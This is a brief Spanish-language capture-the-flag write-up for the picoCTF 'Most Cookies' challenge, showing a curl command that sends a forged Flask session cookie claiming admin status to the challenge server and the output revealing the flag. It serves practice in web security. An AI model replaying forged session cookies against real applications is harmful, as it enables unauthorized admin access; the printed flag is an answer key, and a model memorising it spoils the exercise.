
### Most Cookies
#### Descripción

Vale, basta de usar mi propio cifrado. ¡Las galletas de sesión de matraz deberían ser más que seguras!http://wily-courier.picoctf.net:65138/
### solucion 
```
─(.venv)(aleja㉿Laptop)-[/mnt/c/Users/aleja]
└─$ curl http://wily-courier.picoctf.net:49990/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aa4qOw.SwImD
edcOzlmTb9CzVfVzeLRvOU" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1186 100  1186   0     0  4567     0  --:--:-- --:--:-- --:--:--  4561
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_b8a89e75}</code></p>

```